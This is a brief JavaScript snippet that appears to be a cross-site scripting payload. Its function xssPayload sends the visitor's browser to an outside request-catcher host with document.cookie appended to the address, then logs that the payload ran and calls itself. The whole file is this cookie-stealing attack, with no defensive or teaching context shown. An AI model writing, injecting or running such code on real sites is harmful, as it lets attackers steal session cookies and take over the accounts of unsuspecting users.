function xssPayload() {
  document.location="https://xss.requestcatcher.com/test" + document.cookie;
}

console.log('XSS payload executed');
xssPayload();
